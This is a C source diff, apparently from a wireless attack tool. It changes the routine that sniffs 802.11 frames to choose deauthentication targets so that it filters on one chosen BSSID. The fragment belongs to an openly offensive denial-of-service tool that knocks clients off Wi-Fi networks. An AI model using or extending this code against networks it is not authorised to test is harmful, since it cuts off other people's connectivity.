@@ -60,26 +60,6 @@ void print_mac(const uchar* mac) {
 }
 
 
-/* Sniffing Functions */
-uchar *get_target_deauth()
-{
-    uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
-    // Sniffing for data frames to find targets
-    int packet_length = 0;
-    while (1)
-    {
-        packet_length = 0;
-        while (packet_length < 22)
-        {
-            packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
-        }
-        // \x08 - Beacon
-        if (!memcmp(sniffed_packet, "\x08", 1))
-        {
-            return sniffed_packet;
-        }
-    }
-}
 
 struct packet create_deauth_frame(uchar *mac_source, uchar *mac_destination, uchar *mac_bssid, int disassoc)
 {
@@ -406,7 +386,45 @@ int is_in_list(uchar *mac)
     return 0;
 }
 
-struct packet get_deauth_packet(int *state)
+/* Sniffing Functions */
+uchar *get_target_deauth(uchar *bssid)
+{
+    uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
+    int t;
+    // Sniffing for data frames to find targets
+    int packet_length = 0;
+    int first = 1;
+    while (1)
+    {
+        packet_length = 0;
+        while (
+                packet_length < 22
+                ||
+                (
+                    !first
+                    &&
+                    (
+                        memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH)
+                        ||
+                        memcmp(bssid, get_macs_from_packet('a', sniffed_packet, &t), MAC_LENGTH)
+                        ||
+                        memcmp(bssid, get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH)
+                    )
+                )
+            )
+        {
+            first = 0;
+            packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
+        }
+        // \x08 - Beacon
+        if (memcmp(sniffed_packet, "\x08", 1))
+        {
+            return sniffed_packet;
+        }
+    }
+}
+
+struct packet get_deauth_packet(int *state, uchar *bssid)
 {
     uchar * sniffed_packet_data = NULL;
     int is_wds = 0;
@@ -418,7 +436,7 @@ struct packet get_deauth_packet(int *state)
     case 0:
         while(1)
         {
-            sniffed_packet_data = get_target_deauth();
+            sniffed_packet_data = get_target_deauth(bssid);
             mac_access_point = get_macs_from_packet('a', sniffed_packet_data, &is_wds);
             mac_station = get_macs_from_packet('s', sniffed_packet_data, &is_wds);
             mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
